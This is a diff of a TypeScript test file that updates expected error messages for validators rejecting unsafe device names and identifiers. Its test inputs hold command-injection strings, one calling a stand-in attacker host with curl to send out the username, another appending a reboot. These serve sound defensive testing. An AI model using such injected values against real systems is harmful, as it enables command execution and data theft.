@@ -170,7 +170,9 @@ describe('CommonUtils', () => {
                 thrown = error as Error;
             }
             expect(thrown, `expected rejection for ${unsafe}`).to.be.an('error');
-            expect(thrown?.message).to.match(/cannot be safely opened on Windows/);
+            expect(thrown?.message).to.match(
+                /double quote, a percent sign, or a newline cannot be opened safely on Windows/
+            );
         }
     });
 
@@ -527,11 +529,15 @@ describe('CommonUtils', () => {
 
         it('rejects a name containing shell metacharacters', () => {
             const malicious = 'foo; curl http://attacker/$(whoami); #';
-            expect(() => CommonUtils.assertSafeDeviceName(malicious)).to.throw(/cannot be safely used/i);
+            expect(() => CommonUtils.assertSafeDeviceName(malicious)).to.throw(
+                /only letters, numbers, spaces, and \. _ - are allowed/i
+            );
         });
 
         it('rejects an empty name', () => {
-            expect(() => CommonUtils.assertSafeDeviceName('')).to.throw(/cannot be safely used/i);
+            expect(() => CommonUtils.assertSafeDeviceName('')).to.throw(
+                /only letters, numbers, spaces, and \. _ - are allowed/i
+            );
         });
     });
 
@@ -542,11 +548,15 @@ describe('CommonUtils', () => {
         });
 
         it('rejects an identifier containing a space', () => {
-            expect(() => CommonUtils.assertSafeDeviceIdentifier('iPhone 8')).to.throw(/cannot be safely used/i);
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('iPhone 8')).to.throw(
+                /only letters, numbers, and \. _ - are allowed \(no spaces\)/i
+            );
         });
 
         it('rejects an identifier containing shell metacharacters', () => {
-            expect(() => CommonUtils.assertSafeDeviceIdentifier('x86_64;reboot')).to.throw(/cannot be safely used/i);
+            expect(() => CommonUtils.assertSafeDeviceIdentifier('x86_64;reboot')).to.throw(
+                /only letters, numbers, and \. _ - are allowed \(no spaces\)/i
+            );
         });
     });
 
